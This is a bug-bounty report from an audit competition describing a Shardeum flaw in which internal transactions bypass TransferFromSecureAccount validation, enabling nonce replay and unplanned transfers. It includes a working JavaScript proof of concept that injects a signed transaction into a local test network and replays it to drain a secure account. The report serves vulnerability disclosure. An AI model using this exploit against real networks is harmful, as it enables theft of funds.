# #39850 \[BC-Medium] Bypass TransferFromSecureAccount transaction validations

**Submitted on Feb 8th 2025 at 22:59:06 UTC by @Blockian for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39850
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/shardeum/shardeum/tree/bugbounty>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

## Description

## Impact

All validations in [`verify`](https://github.com/shardeum/shardeum//blob/bugbounty/src\shardeum\secureAccounts.ts#L175-L175) can be bypassed, leading to:

1. Replay attack (nonce is not checked)
2. Unplanned transfers (`nextTransferTime` and `nextTransferAmount` are not checked)

## Root Cause

In the function [`apply`](https://github.com/shardeum/shardeum//blob/bugbounty/src\index.ts#L3984-L3984) the [call](https://github.com/shardeum/shardeum//blob/bugbounty/src\index.ts#L4038-L4038) to [verifyTransferFromSecureAccount](https://github.com/shardeum/shardeum//blob/bugbounty/src\shardeum\secureAccounts.ts#L175-L175) can be avoided if `isInternalTx` is `true`, because [`applyInternalTx`](https://github.com/shardeum/shardeum//blob/bugbounty/src\index.ts#L2652-L2652) would be [called](https://github.com/shardeum/shardeum//blob/bugbounty/src\index.ts#L3996-L3996) before.

## Attack Flow

An outside attacker can :

* Wait for one transaction to be called
* replay it to drain the source address

Inside attackers can:

* Call a transfer that is unplanned

## Suggested Fix

* Move the call to [`verify`](https://github.com/shardeum/shardeum//blob/bugbounty/src\shardeum\secureAccounts.ts#L175-L175) to inside [`applyInternalTx`](https://github.com/shardeum/shardeum//blob/bugbounty/src\index.ts#L2652-L2652)

## Severity

* This allows to drain a source secure account entirely and defeats the entire purpose of secure accounts, and so it critical.

## Proof of Concept

## Proof of Concept

1. Add these multisig addresses:

```js
'0xF466CC8c400Efc90847d21E9fa065aC38d21C860': DevSecurityLevel.High,
```

2. Run a network with 10 nodes
3. Run the following code once the network is ready

```js
import axios from "axios";
import crypto from '@shardus/crypto-utils';
import { ethers } from 'ethers'
import { Utils } from '@shardus/types'

crypto.init("69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc")

let privateKey = "0xe68cb07c0990cefc7babae8f73f64164521e3223c6a4292959606d80e33b4a5b"
let wallet = new ethers.Wallet(privateKey)

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

const secureAccount = {
    "Name": "Team",
    "SourceFundsAddress": "0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
    "RecipientFundsAddress": "0xde368dce1070dba428b8133265666261ddca9f1a",
    "SecureAccountAddress": "f2129aaf113129fbbf22b8513a95ed9f16d09977000000000000000000000000",
    "SourceFundsBalance": "71120000000000000000000000"
}

const main = async  () => {
    console.log("Grabbing Nodelist ....");
    let res = await axios.get('http://0.0.0.0:4000/nodelist')
    const nodelist = res.data.nodeList
    const randomNode = nodelist[Math.floor(Math.random() * nodelist.length)]

    let transferFromSecureAccountTx = {
        isInternalTx: true,
        internalTXType: 13,
        amount: "100000000000000",
        accountName: secureAccount.Name,
        nonce: 1,
        from: "Blockian"
        
    }

    const txData = {
        amount: transferFromSecureAccountTx.amount,
        accountName: transferFromSecureAccountTx.accountName,
        nonce: transferFromSecureAccountTx.nonce
    }
    const payload_hash = ethers.keccak256(ethers.toUtf8Bytes(Utils.safeStringify(txData)))
    
    let sig = await wallet.signMessage(payload_hash)
    transferFromSecureAccountTx.sign = [{"sig": sig, "owner": wallet.address}]
    
    const before = await axios.get(`http://${randomNode.ip}:${randomNode.port}/account/${secureAccount.SourceFundsAddress}`)
    console.log("Balance before attack --------------------------------------")
    console.log(before.data);
    
    res = await axios.post(`http://${randomNode.ip}:${randomNode.port}/inject`, transferFromSecureAccountTx)
    if(!res.data.success) throw new Error(res.data.reason)
 
    console.log("Waiting 20 sec for transaction to be finalized");
    await sleep(20000)

    const after = await axios.get(`http://${randomNode.ip}:${randomNode.port}/account/${secureAccount.SourceFundsAddress}`)
    console.log("Balance after transaction --------------------------------------")
    console.log(after.data);
}

main();
```

4. Re run it again with the same nonce / transaction and notice how it still works even though the none is out of sync and no transfer is planned
